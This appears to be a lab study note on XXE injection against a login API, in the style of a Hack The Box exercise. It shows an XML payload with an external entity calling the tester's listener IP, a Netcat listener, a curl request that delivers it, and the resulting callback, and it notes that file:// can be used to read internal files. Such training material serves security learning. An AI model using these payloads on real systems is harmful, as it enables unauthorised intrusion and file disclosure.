---
title: h-XXE
draft: false
tags:
  - xxe
---
XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down.

> Suppose we are assessing such an application residing in `http://<TARGET IP>:3001`. By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.

Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it.

Now let us try authenticating. We should see the below inside Burp Suite's proxy.

```
POST /api/login HTTP/1.1


<?xml version="1.0" encoding="UTF-8"?>
	<root>
		<email>
		test@test.com
		</email>
		<password>
		P@ssw0rd
		</password>
	</root>
```

- We notice that an API is handling the user authentication functionality of the application.
- User authentication is generating XML data.

First, we will need to append a DOCTYPE to this request.

> DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).

Our current payload is:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```


We have called our external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.

Let us set up a Netcat listener as follows.

```shell-session
jadu101@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
```

Now let us make an API call containing the payload we crafted above.

```shell-session
jadu101@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```

After the call to the API, you will notice a connection being made to the listener.

```shell-session
jadu101@htb[/htb]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
GET / HTTP/1.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```

